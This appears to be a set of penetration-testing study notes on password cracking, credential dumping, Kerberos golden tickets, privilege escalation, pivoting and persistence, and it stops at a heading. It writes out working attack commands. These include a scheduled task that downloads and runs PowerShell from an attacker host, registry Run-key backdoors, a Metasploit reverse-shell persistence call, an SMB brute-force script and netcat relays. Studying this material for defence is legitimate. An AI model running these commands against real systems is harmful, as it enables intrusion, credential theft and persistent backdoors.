- Intercept authentication and send to a password cracker
- Run cracker against network service without lockout
- Run cracker against accounts exempt from lockout (e.g admin/root)

#### DOWNLOAD MAKERs
- CeWL
- crunch
- cuppy.py
- pydictor
- Dymerge

#### DICTIONARY ATTACK TOOLS
- BlackArch Linux
- Has 166 password cracking tools
- GitHub (has 24 password cracking tools)
- L0pht7 #Windows
- John-the-Ripper
- Hashcat
- 

#### BRUTE FORCE ATTACK
- Used if the dictionary does not contain the password
- Tries combinations of characters until the password is found
- is the slowest and most resource intensive
- Many password cracking tools include online brute forcing capabilities
- GitHub lists 159 brute force passwords crackers
- Sometime "brute force" is also referred to a large dictionary attack
- In this case, the dictionary attack is considered to be a specific type of brute force attack

#### RAINBOW TABLE
- A Rainbow table attack is an attack in which passwords in the wordlist have been pre-computed into their corresponding hashes, then compressed in a highly efficient manner
- Very fast with minimal computation, but at the cost of very large table
- A special reduction function is used to reduce the table size
	- A chain of hashes for one password can be used to quickly calculate variations of the same password
	- 64 GB of a rainbow table can contain around 70 trillion hashes
	- 64 GB of a wordlist can only contain around 6.5 billion passwords
- Password crackers that can use rainbow tables include Ophcrack, RainbowCrack and Mitre.org,s CAPEC

#### RAINBOW TABLE CREATION TOOLS
- rtgen
- Winrtgen
- RainbowTables Generation (github)
- RainbowCrack

#### PASSWORD SPARYING?
- A brute force variant
- The same password is sprayed across many accounts
	- As opposed to many passwords being tried against a single account
- Is used to circumvent common brute forcing countermeasure such account lockout
- If none of the accounts uses the password, then another password is sprayed
- Password Spraying Tools
	- Office365 Sprayers
		- Go365
		- MSOLSpray
	- Active Directory Sprayers
		- RDPPAssSpray
		- CrackMapExec
		- DomainPasswordSpray
		- Greenwold/Spray



### 6.12 PASSWORD  CRACKING TOOLS

- John the Ripper
	- Works on unix, windown and kerberos
	- compatible with mysql, ldap and MD4
	- Supports both dictionary and brute force attack
	- Uses rules to create complex patterns from a wordlist
	- Can perform distributed cracking
```
sudo unshadow /etc/passwd /etc/shadow > mypassword.txt
john mypassword.txt
```
- HashCat
	- Advanced password recovery tool
	- Uses GPU to offload cracking
	- Currently supporst 237 hash types
	- Also uses rules
- RainbowCrack : Offline hash cracker that uses Rainbow tables
- Tools to brute force remote authentication servicess
	- THC-Hydra
	- Medusa
	- Ncrack
	- NMAP security scanner
	- Brutus aet2
	- NetBIOS Auditing Tool
- Metasploit modules 
	- auxiliary/analyze/crack_windows
	- auxiliary/analyze/crack_mobile
	- post/windows/gather/hashdump
	- post/windows/gather/credentials/credential_collector
- Cain & Abel
	- Windows software; cracks hash passwords (LM, NTLM) sniff network packets for password sniff out for local stored passwords, etc
- L0pht: paid software ; extract and crack hashes, uses brute force or dictionary attack
- Ophcrack: Free open-source ; cracks windows log-in passwords by using LM hashes through rainbow tables
- RainbowCrack: Rainbow tables generator for password cracking
- Legion
	- Automates password guessing in NetBIOS sessions
	- Scans multiple IP Address ranges for Windows shares
	- Also offers a manual dictionary attack tool
- KerbCrack : Cracks Kerberos password
- Mimikatz :
	- Steals credentials and escalates privileges
	- Windows NTLM hashes and Kerberos tickets (Golden Ticket Attack)
	- 'Pass-the-hash' and 'pass-the-ticket'
- fgdump
	- Dump SAM databases on windows machines
- pwdump7 : Dump SAM databases on windows machines


##### Download pre-created rule sets
- clem9669 rules : Rules for hashcat or john
- Hashcat rules collection - probably the largest collection of Hashcat rules out there
- Hob0Rules: Password cracking rules for Hashcat based on statistics and industry patterns
- Kaonashi - wordlist, rules and masks from kaonashi project (RootCon 2019)
- nsa-rules - Password cracking rules and masks for Hashcat generated from cracked passwords
- nyxgeek-rules - Custom password cracking rules for Hashcat and John the Ripper
- OneRuleToRuleThemAll - One rule to crack all passwords. or at least we hope so
- Pantagrule - Large Hashcat rulesets generated from real-world compromised passwords


#### DISTRIBUTED PASSWORD CRACKING
- you can offload some of the cracking toad to other computer running cracking tools 
- running cracking program on dedicated GPUs 
- To running on websites dedicated  to provide online service 
	- onlinehashcrack.com
	- crackstation.net
	- gpuhash.me
	- md5decrypt.net


#### Examine if identity is PWNED?
use password compromise notification services
- Google Password checkup site
- Chrome password checkup tool
- Microsoft edge Profiles / passwords
- MacOS System preferences/ passwords
- IOS passwords/ security REcommendations
- Android Chrome app check passwords

#### FINDING DEFAULT PASSWORDS ON THE INTERNET
- www.open-sez.me
- www.fortypoundhead.com
- cirt.net
- www..defaultpassword.us
- defaultpasswords.in
- Github list 95 repos that list default and hard-coded passwords


#### ADDITIONAL PASSWORD ATTACKS
Use privileges from buffer overflow, etc. ,to create new account
Meterpreter steal_token or impersonate_token commands
Use a dumped hash to create a new account or Kerberos ticket
Keylogging
Social engineering (including coercion (rubber hose attack))
Boot into another operating system and overwrite existing password storage

### 6.13 Windows Password cracking
 - Dump credentials from memory
	- LSA secrets, password hashes, tokens, copies of old passwords, locally cached login
	- information
	- Crack dumped hashes offline
- Steal a copy of the local SAM database and crack offline
- Steal a copy of the Active Directory database (ntds.dit) and crack offline
- Extract the SYSKEY boot key
	- SYSKEY was a utility that allowed you to lock (encrypt) the SAM database
	- You would have to enter a password to unlock it so Windows could boot
	- In Windows 10, SYSKEY was replaced by BitLocker disk encryption
- Social engineering :	- (Aw come on, that’s not cracking!)
-  Intercept and crack credentials sent over the network
	- Passive sniffing
	- Man-in-the-Middle
	- Plain text password
	- LM, NTLM, NTLMv2, Kerberos
- Brute force network services that require user authentication
	- Logon/SMB/File and Print Server (TCP 139, 445)
	- IIS (TCP 80, 443)
	- MS Exchange (TCP 25, 110, 143)
	- MSSQL (TCP 1433)
- Brute force remote control services
	- RDP (TCP 3389)
	- Telnet (TCP 23)

#### METHODS TO SPEED UP PASSWORD CRACKING
- Use larger dictionaries
- Focus first on well-known words, terms, or patterns
- Use mask attack
	- Set of characters you try is reduced by information you know
		- Example: knowledge of a start or end character (it’s a number, it’s upper case, etc.)
- Use pre-computed hashes (rainbow tables)
- Use high-end GPUs (video cards)
- Use distributed cracking
- Use online cracking services
- Try password spraying
- Pass-the-hash
	- Don’t bother trying to crack the password ;-)
- Social engineering
	- Bribery, coercion, shoulder surfing, MITM...


#### WINDOWS CREDNTIAL MANAGER

- Introduced in Windows Server 2008 R2 and Windows 7 as a Control Panel feature
- Used to store and manage user names and passwords
- Lets users store credentials relevant to other systems and websites in the secure- Windows Vault
- Some versions of Internet Explorer use this feature for authentication to websites
- You can also use NirSoft VaultPasswordView to dump Windows Vault passwords


#### WINDOWS LSA SECREATS

- The Local Security Authority manages the Windows system’s local security policy
- LSA secrets stores system sensitive data, such as:
	- User passwords (Internet Explorer, Windows Messenger, Dialup/VPN)
	- Internet Explorer and Windows Messenger passwords
	- Service account passwords (Services on the machine that require authentication with a secret)
	- Cached domain password encryption key
	- SQL passwords
	- SYSTEM account passwords
	- Account passwords for configured scheduled tasks
	- Time left until the expiration of an inactivated copy of Windows
- Access to the LSA secret storage is only granted to SYSTEM account processes

##### TOOLS to Dump Windows LSA Secrets
- Metasploit post/windows/gather/lsa_secrets
- Cain & Abel
- Mimikatz
- pwdump
- LSAdump
- Procdump
- secretsdump.py
- Creddump
- CacheDump
- QuarksDump
- Gsecdump
- hobocopy


#### WINDOWS HASHES
- Windows actually stores a user's password hash twice
	- In LM and NT hash formats
	- Both used by SAM and Active Directory for Backward compatibility
- LM
	- Specialized unsalted 56-bit DES one-way encryption (not a true hash)
	- Case-insensitive printable ASCII
	- 14 Characters exactly (Shorter passwords are NULL padded become 14 characters)
	- Actual keyspace (possible character combinations) is reduced to 69
- NT Hash
	- Unicode (keyspace is 65536 characters)
	- 127 Characters max
	- unsalted MD4

#### LM SHASHING PROCESS
- The user's password is restricted to a maximum of fourteen characters
- The user’s password is converted to uppercase
- The user's password is encoded in the System OEM code page
	- Printable ASCII characters except DEL
- This password is NULL-padded to an exact length of 14 bytes
- The 14-byte password is split into two 7-byte halves
- Each half is used to create a DES encryption key
	- One from each half with a parity bit added to each to create 64-bit keys.
- Each DES key is used to encrypt a preset ASCII string (KGS!@#$%)
	- Results in two 8-byte ciphertext values
- The two 8-byte ciphertext values are combined to form a 16-byte value
	- This is the completed LM hash

#### WINDOWS LAN MANAGER AUTHENTICATION

- Windows LAN Manager authentication protocol has three variants
- All have these characteristics:
	- Challenge-response (Challenge handshake) based
	- No support for multifactor authentication
	- Unsalted password hashes allow attacker to "pass the hash" to authenticate
- You can configure Group Policy to allow /disallow LM and NTLM


| LAN Manager Authentical protocol | Description                  |
| -------------------------------- | ---------------------------- |
| LM                               | Des-based LM hash            |
| NTLM (NTLMv1)                    | DES-based unicode pwd        |
| NTLMv2                           | Challenge handshake with MD4 |

> windows network security : LAN Manager authentication level property can be configured  for which type of authentication required.
##### LM and NTLM Authentication
1. Client initiate with 'Authen_Request'
2. Server Response with "Server_Challenge" nonce
3. Client provide "LM Response-" DES (LM Hash, nonce)
4. also Client provide NTLM Response - DES (Unicode pwd, nonce)
5. Finally server response with 'Authn_result'


##### NTLMv2 Authentication

1. Client initiate with 'Authen_Request'
2. Server Response with "Server_Challenge" nonce
3. Client provide "LM Response-" DES (DUMMY)
4. also Client provide NTLM v2 Response - f (Unicode pwd, nonce (s), nonce (c) )
5. Finally server response with 'Authn_result'


#### ONLINE WINDOWS PASSWORD CRACKING TOOLS

- Meterpreter hashdump
- Metasploit modules:
	- post/windows/gather/hashdump
	- post/windows/gather/credentials/credential_collector
- Cachedump
- Samdump2
- fgdump.exe
- pwdump7.exe
- Gsecdump
- hobocopy
- L0pht

#### NETWORK SERVICE PASSWORD CRACKING TOOLS

- Medusa
- THC hydra
- Brutus
- Wfuzz
- NetBIOS auditing Tool

#### OFFLINE WINDOWS SAM CRACKING TOOLS
- Hashcat
- John the Ripper
- L0ohtCrack
- Ophcrack
- Rainbow Crack
- Cain and Abel
- Vssown.vbs
> Based on the benchmarking finding a fully outfitted password hashing rig with eight RTX 4090 GPUs would have the computing power to cycle through all 200 billion iterations of an eight-character (NT hash) password in 48 minutes and LM password can be cracked in 15 seconds

#### SYSKEY AND BITLOCKER EXPLOITS
- Tools to crack syskey
	- bkhive
	- bkreg(pre-service pack 4 machines)
- Bitlocker replaced Syskey
	- It encrypts the entire disk
	- the key is stored in the trusted platform module chip on the motherboard
	- You can create a recovery disk to type in the long recovery key
- Tools to crack the bitlocker key
	- Elcomsoft Forensic Disk Decryptor
	- 

Active Directory Authentication
- Uses Kerberos v5
	- Two way pass-through authentication
	- Supports multi-factor authentication
	- Time-limited to reduc replay attacks
- Can be forced down to NTLM
- Passwords stored in active Directory database ntds.dit
	- Stored in NT HAsh format
- Uses a ticket based system to improve performance
	- Authenticated user is given a time limited ticket granting ticket (TGT)
	- TGT is presented at each resource-hosting server the user visits.
	- Resources server grants the user a time-limited session ticket
	- The user does not have to authenticate again until the session ticket expires (10 hours)

#### KERBEROS GOLDEN TICKET
- TGTs are encrypted by the password hash of system account called krbtgt
- Kerberos authentication assumes that any TGT encrypted with the KRBTGT password has is legitimate
- An attacker can create their own Golden Ticket with the following information
	- Domain Name
	- Domain SSI
	- Username to impersonate
	- Krbtgt NTLM hash
- The NTLM hash of the krbtgt account can be obtained via the following methods
	- DCSync (Mimikatz)
	- LSA (Mimikatz)
	- Hashdump (Meterpreter)
	- NTDS.DIT
	- DCSync (Kiwi)
- Use mimkatz to create a golden Ticket
``` kerberos::golden /user:evil /domain:pentestlab.local /sid:<krbtgt SID> /krbtgt NTLM hash> /ticket:/evil.tck /ptt
```


#### ACTIVE DIRECTORY PASSWORD CRACKING

- Online attacks
	- Use a password sprayer
	- Meterpreter hashdump
	- Metasploit smart_hashdump
- Offline attacks
	- Obtain a copy of the Active Directory database (ntds.dit)
	- Attempt to crack the stored NT hashes
	- Tools include
		- ntdutil.exe
		- VSSAdmin
		- Powersploit NinjaCopy
		- DSInternals Powershell module
		- ntds_dump_hash.zip
		- Metasploit modules
			- post/windows/gather/ntds_location
			- post/windows/gather/ntds_grabber

##### KERBEROS PASSWORD CRACKING TOOLS (KERBEROSTING)
- Mimikatz
- Powersploit
- John the Ripper
- Hashcat
- Kerberosting tool kit (github/nidem.kerberoast)
- Empire
- Impact
- Metasploit module (auxiliary/gather/get_user_spns)


#### Tools to Dump Cached Domain Credentials 
- Active Directory permits users to authenticate to their computer using cached domain credentials
	- This is useful for telecommuters and users who do not have access to the coporate network when they first log on to their laptop
	- The default policy permits 10 logons using cached credentials
	- After that, the user must actually authenticate against a domain controller
- Tools to dump cached credentials include:
	- Cain & Abel
	- Creddump
	- Passcape's windows password recovery
	- Cachedump
	- Fgdump
	- PWDumpX

#### GROUP POLICY PREFERENCES
- Group policy preferences (GPP) allow a domain administrator to use Group Policy to set local passwords on domain-joined computers
	- Often used to set a local administrator passwords on domain-joined clients and servers.
- Tools to dump passwords delivered by GPP include
	- Metasploit module post/windows/gather/credentials
	- Powersploit Get-GPPPassword.ps1
	- gppprefdecrypt.py


### 6.14 Linux password Attacks


| Attack Method                                                                                                              | Tools                                                                                                           |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| BRUTE force service passwords<br>SSH, telnet, FTP, HTTP, samba, VNC, etc                                                   | - John the Ripper<br>- Medusa<br>- THC Hydra<br>- NCrack<br>- Crowbar<br>- Metasploit auxiliary/scanner modules |
| copy /etc/passwd and /etc/shadow files<br>unshadown (combine) the copies<br>send combined copy to  a password cracker      | John the Ripper<br>- Medusa<br>- THC Hydra<br>- NCrack<br>- Crowbar                                             |
| Dump hashes from a compromised machine<br>Send hashes to a password cracker                                                | - Metasploit module post/linux/gather/hashdump<br>- John the Ripper<br>- RainbowCrack<br>- Hashcat<br>          |
| Dump cleartext passwords currently stored in memory                                                                        | Mimipenguin (GitHub)                                                                                            |
| Pass the hash if passwords take too long to<br>crack. Works particularly well against Samba with LM or NTLM authentication | Metasploit module<br>auxiliary/scanner/smb/smb_login                                                            |
| Install a physical or software based keylogger                                                                             | - Meterpreter keyscan_start and keyscan_dump commands<br>- USB keyloggers                                       |
| Install a physical or software based keylogger                                                                             | <br>- Kali Social Engineering Toolkit (SET)<br>- WiFi-pumpkin                                                   |
| Boot the target computer into single user<br>mode to reset the root password                                               | - Reboot and edit GRUB to enter single user mode<br>- Change the root password                                  |
|                                                                                                                            |                                                                                                                 |


### 6.15 OTHER METHODS FOR OBTAINING PASSWORDS

#### ADDITIONAL  PASSWORD ATTACKDS


 - Use privileges from buffer overflow, etc., to create a new account
- Impersonate a user token:
	- Meterpreter steal_token command
		- Formerly Incognito
- Use a dumped hash to create a new account or Kerberos ticket
- Sniffing / intercepting
- Installation and configuration files
	- Text editor
	- Knowledge of and access to answer file location
 - Keylogging:
	- Meterpreter keyscan_start and keyscan_dump commands
	- USB keyloggers
- Social engineering:
	- Phishing
	- Eavesdropping / shoulder surfing / dumpster diving
	- Kali Social Engineering Toolkit (SET)
	- WiFi-Pumpkin
	- Bribery / persuasion
	- Coercion (Rubber Hose Attack!)
- Boot into another Operating System and overwrite existing password storage
	- CHNTPW
	- Ultimate Boot CD for Windows
	- BartPE
	- Offline NT Password & Registry Editor
	- http://pogostick.net/~pnh/ntpasswd/


##### PASSIVE NETWORK SNIFFING WITH WIRESHARK 
> works if the sniffer is on the same shared network segment. Capture clear text credentials

##### ARP POISIONING with tools like
- ETTERCAP: capture login session
- 'Cain & Abel' : capture and crack password hash


##### LLMNR POISONING
- Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are local Microsoft name resolution mechanisms
	- Used when DNS lookups fail
- NBT-NT is legacy
	- Broadcast-based
- LLMNR was introduced in Windows Vista
	- Multicast-base
- LLMNR spoofing tools
	- Responder
	- Metasploit
	- NBNSpoof
	- NBNSpoof
	- Inveigh

##### CHNTPW
- A software utility for resetting or blanking local passwords in windows
- Overwrites the space on disk where the the passwords are stored
- Available
	- as a downloadable ISO
	- In Ubuntu 9.10 linux LiveCD
	- In Kali Linux


#### SWAPPING UTILMAN.exe with CMD.exe
Replacing will obtain system level command prompt without logging in
- Boot from an alternate OS or a windows installation disk /USB stick
- At first screen press Shift+f10 to open a command prompt
- Rename utilman.exe to utilman.old
- Rename cmd.exe to utilman.exe
- Restart
- At the login screen, launch accessibility options
	- Click icon
	- or press Windows key +U
	- Reset the administrator password, create accounts ,etc
- used for Window NT, 2000, XP, VISTA, 7, 8 , 8.1
- IT physically overwrites the password section of the SAM file



### 6.16 NETWORK SERVICE ATTACKS


#### ATTACKING SERVICES
- Services usually listen on well-known network ports
- They might be vulnerable to network-based attacks including:
	- Buffer overflows
	- Password brute forcing
	- Password spraying
- Refer to /etc/services text file for common well-known ports and their services
- `Windows: %systemroot%\system32\drivers\etc\services`
- Use nmap -A to scan to interrogate ports and their listening services for their - version
	- Then research exploits for that version

#### NETWORK SERVICE ATTACKS
- Performed by directly communicating with the victim's machine
- Includes:
	- Dictionary and Brute-force attacks
	- hash injections
	- installation via social engineering
	- Trojans
	- spyware
	- keyloggers
	- password guessing

#### CLEAR TEXT TCP PROTOCOLS

| Service              | TCP Port |
| -------------------- | -------- |
| FTP                  | 21,20    |
| TELNET               | 23       |
| SMTP                 | 25       |
| HTTP                 | 80       |
| POP3                 | 110      |
| IMAPv4               | 143      |
| NetBIOS/SMB/WinLogon | 139,445  |
| SQLnet               | 1521     |


#### CLEAR TEXT UDP PROTOCOLS

| Service | UDP Port |
| ------- | -------- |
| DNS     | 53       |
| TFTP    | 69       |
| SNMP    | 161, 162 |
| RADIUS  | 1812     |
|         |          |

#### INTERCEPTING TRANSMITTED PASSWORDS
- Sniff the network in hopes of intercepting a password (clear text or hash)
- Passive sniffing or MITM
- Tools for intercepting passwords:
	- Cain and Abel
		- ARP poisoner and password cracker
	- Ettercap
		- MITM ARP poisoner
	- KerbCrack
		- Built-in sniffer and password cracker
		- Looks for Kerberos Port 88 traffic
	- ScoopLM
		- Specifically looks for Windows authentication traffic
		- Has a built-in password cracker


#### WHY BRUTE FORCE NETWORK SERVICES
- Users regularly log into network services
- Network services often store user credentials in the operating system
	- Services are integrated into the OS
	- Many services do not maintain their own usernames/passwords
	- They use operating system accounts
	- Once cracked, the credentials can be used to log in directly to the OS or against other
	- network services
- Target a user account that cannot be locked out, such as administrator or root
	- An administrator might also configure a service account to never be locked out



#### NETWORK BRUTE FORCING TOOLS
- THC-Hydra
- Medusa
- Ncrack
- AET2 Brutus
- L0phtcrack
- Metasploit auxiliary/scanner modules

##### SAMPLE AUTOMATED SMB LOGIN SCRIPT


```
\\ credentials.txt contains space separeted rows 'username password'
FOR /F “tokens=1,2*” %i in (credentials.txt)^
do net use \\server\IPC$ %j /u:company.com\%i^
2>>nul^
&& echo %time% %date% >> outfile.txt^
%% echo \\server acct: %i pass: %j >> outfile.txt
```

### 6.17 POST EXPLOITATION

#### WHAT IS PRIVILEGE ESCALATION?
- Exploiting a bug, design flaw or configuration oversight in an operating system or - software application
- Typically performed after you successfully compromise a host with standard/low-level credentials
	- You want to elevate your attacker session to root/administrator, or preferably SYSTEM
	- Escalation is usually performed as a local exploit on the compromised host
- There are two types of privilege escalation:
	- Vertical
		- A Lower-level user or process executes code at a higher privilege level
		- Example: A standard user account gains administrator/root privilege
	- Horizontal
		- Execute code at the same privilege level
		- But from a location that would normally be protected from access


#### PRIVILEGE ESCALATION EXAMPLE

- Attacker performs Reconnaissance
- perform SQL injection
- Hash Crack
- Admin login
- Privilege escalation (as root)


#### PRIVILEGE ESCLATION METHODS


| Method / Vulnerability                | Description                                                                                                                                                                                                                                                  |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Kernel exploits                       | Exploit weaknesses in the OS Kernel                                                                                                                                                                                                                          |
| Writable services                     | Edit the startups parameters of a service, including its executable path and account<br>Use unquoted service paths to inject a malicious app that the service will run at start up                                                                           |
| User application compromise           | - Compromise applications such as Internet Explorer, Adobe Reader, or VNC to gain access to a workstation<br>- Use UAC bypass techniques to escalate privilege<br>- Attacks typically require a victim to open a file or web page through social engineering |
| Local User Access Control bypass      | - Bypass local windows UAC<br>- Use process injection to leverage a trusted publisher certificate                                                                                                                                                            |
| Weak process permissions              | - Find processes with weak controls and attempt to inject malicious code into those processes                                                                                                                                                                |
| Shared folders                        | - Search for sensitive information is shared folders                                                                                                                                                                                                         |
| DLL hijacking                         | <br>- Elevate privileges by exploiting weak folder permissions, unquoted service paths, or applications that run from network shares<br>- Replace legitimate DLLs with malicious ones                                                                        |
| Task Scheduler 2.0                    | - Task Scheduler 2.0 does not properly determine the security context of its scheduled tasks, allowing an attacker to escalate privilege<br>- Affects windows Vista SP1 / SP2 windows Servers 2008 Gold, SP2/ R2 Window 7<br>-CVE-2010-3338,MS10-092         |
| Missing patches and misconfigurations | - Search for missing patches or common misconfiguration that can lead to privilege escalation                                                                                                                                                                |
| Windows unquoted service paths        | - Spaces in a executable's path provide opportunity to inset a malicious version earlier in the path.<br>`c:\Program Files\Folder A` . if program.exe is not found then c:\program files\folder.exe will be searched.                                        |
|                                       |                                                                                                                                                                                                                                                              |
#### LINUX PRIVILEGE ESCALATION TECHNIQUES
- look for crontabs and find misconfiguration on privileges
- Change setuid and setgid on files in linux / unit to run in owner privilege
	- Insecure sudo can lead a privilege escalation to root
	- If there's any system command that allows NOPASSWD option this may lead to escalation
- Privilege Escalation Tools
	- Metsploit post modules
	- PowerSploit
	- Dameware Remote support
	- ManageEngine Desktop Central
	- Searchsploit DB
	- PDQ Deploy
	- PSExec
	- TheFatRat
	- GitHub (248) repos
- 

#### WHAT is POST EXPLOITATION
- After you have a Meterpreter prompt, you can run additional Metasploit modules from - within that session
- These are useful for gathering further information from the target network
- Metasploit has almost 400 post exploitation modules
	- Background your Meterpreter session and then search for and execute the desired post module
- Popular modules include:
- Hash dumping/credential gathering
- Local exploit suggester
- ARP scanner
- Get local subnets
- Add a route on target from attacker to internal network
- Application enumeration
- User enumeration
- Example:
```
run post/windows/gather/smart_hashdump
run auxiliary/analyze/jtr_crack_fast
\\suggest local exploits for privilege escalation
	post/multi/recon/local_exploit_suggester

\\ Find out if your target is a virtual machine, and what type:
	post/windows/gather/checkvm
\\See what countermeasures the target has in places:
	getcountermeasure
\\ kill any possible anti-virus running on the target
	post/windows/manage/killav
\\Perform an ARP scan for a given range through a compromised host:
	post/windows/gather/arp_scanner RHOST=<subnet ID/CIDR mask?
\\ Find out what other subnets the host might be attached to:
	get_local_subnets
\\ Attempt to add a route to those subnets into the target's routing table
	post/multi/manage/autoroute
	
```


### 6.18 PIVOTING

#### What is PIVOTING?
- What is pivoting uses a compromised machine to get into an otherwise inaccessible private network or service
- You can
	- Remote control the compromised machine to start new attacks against the internal
	- Use the compromised machine as a router between the attacker and the internal network

#### PIVOTING THROUGH REMOTE CONTROL
-  The attacker compromises a host that has access to both the public and private network. For example
	- A web server in the target DMZ
	- An internal host (compromised via social engineering) with a reverse connection to the attacker
- Attack tools are uploaded to the compromised host
- The compromised host acts as a staging point to further attack the internal network 
- (via remote control) the compromised host is doing the attacking
- Common remote control methods include
	- RDP/VNC
	- Meterpreter
	- RAT 
	- Telnet/SSH
	- psexec
#### PIVOTING THROUGH ROUTING
- AKA Network pivoting
- The attacker has compromised a host but cannot upload or run additional tools on that host for whatever reason:
	- Wrong OS
	- Limited resources
	- Antivirus
	- Other restrictions
- The attacker can use the Meterpreter session itself on the compromised host as a router
- Since the routing is happening through the VPN of the Meterpreter session, Its doesn't matter if the internal network uses private IP addresses
	- The attacker adds a router to the internal network, with the session as the default gateway

#### METASPLOIT AUTOROUTE MODULE
- Creates a route using the Meterpreter session as the default gateway.
```
meterpreter > background
msf6 > use post/multi/manage/autoroute 
msf6 post (multi/manage/autorouter) > show options
msf6 post (multi/manage/autorouter) > set SESSION 1
msf6 post (multi/manage/autorouter) > Set SUBNET 10.10.10.0
msf6 post (multi/manage/autorouter) > Set NETMASK /24
msf6 post (multi/manage/autorouter) > run
\\ Note: You will be limited to using metaspoit modules only to attack internal targets

```
#### NETCAT RELAYS
- Netcat can be configured to bounce an attack from machine to machine, or from port to port within the same machine
- It involves setting up both a Netcat listener and a Netcat client on the same machine 
- The traffic is passed between the two Netcat processes
- you can relay:
	- Traffic between ports on the same machine
	- Traffic from a client on that attacker, through the relay, to a listener on the target
	- Traffic between two clients as a meet-in-the-middle relay

#### NETCAT RELAY EXAMPLE
- You must enable Netcat on the relay machines and the target
- You create a daisy of Netcat instances
- Each Netcat listener launches another NetCast instance which will be the client to the next listener
	- Until we get to the final listener on the target
- You can have one or multiple relay machines as needed


#### NETCAT INTERNAL PORT RELAY EXAMPLE
- Find a way to install Netcat on microsoft ISS 5.0 (e.g. unicode exploit)
- Configure Netcat to listen on port 80 (Cut in front of the web service, intercepting any traffic sent to the port)
- [Firewall permits traffic to port 80]
- Configure the Netcat listener to relay traffic to another instance of Netcat, a client that will forward the traffic to TCP 135 (DCOM service using RPC)
- Use Metasploit to send a buffer overflow ms03_026_dcom to port 80
- Attack passes through the firewall and is relayed to the DCOM service on port 135
- SCORE
- METASPLOIT SENDING EXPLOIT TO NETCAT
- `exploit/windows/dcerpc/ms03_026_dcom`

#### WINDOWS LISTENER-TO-CLIENT RELAY

- Create a relay that sends packets from the localport to a Netcat client connected to TargetIPAddress on the port
- On the relay, when the attacker connects to the nc listner, the listener launches a client to the target listener
- Set up relay client, then listener
- `c:\echo nc 10.1.2.3 445 > relay.bat `
- `c:\nc -L -p 80 -e relay.bat`

#### WINDOWS LISTNER-TO-LISTENER RELAY
- Creates a relay that will send packets from any connection on Localport1 to any connect on Localport2
- The relay is in a DMZ it acts as a meet-in-the-middle
- `c:\> echo nc -L -p 8008 > relay.bat`
- `c:\nc -L -p 80 -e relay.bat`
- The target has a scheduled script that periodically exfiltrates a file to the relay


### 6.19 MAINTAINING ACCESS
- Getting an initial foothold inside a network during a red team operation is a time consuming task
- Persistence is key to a successful red team operation
- There are a number of ways to achieve persistence
	- RATS
	- Scheduled tasks
	- Add/modify registry keys
	- Kerberos Golden Ticket or other backdoor account
- Tool to add persistence
	- Metasploit
	- Empire(GitHub)
		- PowerShell post-exploitation Tool
	- SharePersist (Github)

#### REMOTE ACCESS TROJAN AND BACKDOORS
- A Remote Access Trojan (RAT) is a malware program that includes a back door for administrative control over the target computer
- RATs are usually downloaded invisibly with a user-requested program -- such as a game -- or as an email attachment
- They are difficult to detect if designed to look like normal administrative remote access tools
- They allow the attacker to connect later at any time
- Victim has a "Listener" that opens a port for you to connect to
- Or, the victim can make a reverse connection to you the hacker
	- Good for getting past a firewall
	- The hacker must set up a listener

#### RAT AND BACKDOOR TOOLS
- VenomRAT
- Stitch
- Ghost
- Social_X
- NullRAT
- The Fat Rat
- RomCom RAT
- RATMilad
- CodeRAT
- Imminent Monitor RAT
- Konni RAT
- ZuoRAT
- 


#### SCHEDULED TASKS
- Windows Operating Systems provide a utility (schtasks.exe)
- This enables system administrators to execute a program or a script at a specific given date and time
- This kind of behavior has been heavily abused by threat actors and red teams as a persistence mechanism
- You don't need to be an administrator to schedule a task.
```
schtask /create /tn persist /tr
"c:\windows\syswow64\windowPowerShell\v1.0\powershell.exe -WindowStyle hidden -Nologo -NonInteractive -ep bypass -nop -c 
'IEX ( new-object net.webclient),downloadstring ( ''http://<attacker IP>:8080/ZPWLywg)'" /sc onlogon /ru SYSTEM
```

#### REGISTRY RUN KEYS EXAMPLE
- Add registry keys from a terminal, referencing the malicious payload
- The payload executes when the user logs on
- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices"
- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
- 
```
If you have an elevated credential, you prefer to use LOCAL_MACHINE
The payload will execute every time the system boots, regardless of whether a user logs on or not

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"
/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"
```

Two Additional registry keys can be used to execute either an arbitrary payload or a DLL

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001"
/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"

reg add
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v wePwnU /t REG_SZ /d "C:\tmp\pwn.dll"
```


#### METASPLOIT PERSISTENCE
You can run Metasploit script
```
run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r <attacker IP>
```

 - Or you can use the Metasploit post module persistence_exe:
```
use post/windows/manage/persistence_exe
set REXEPATH /tmp/pentestlab.exe
set SESSION 2
set STARTUP USER
set LOCALEXEPATH C:\\tmp
run
```

#### ADDITIONAL PERSISTENCE TOOLS
- Metasploit persistence module examples:
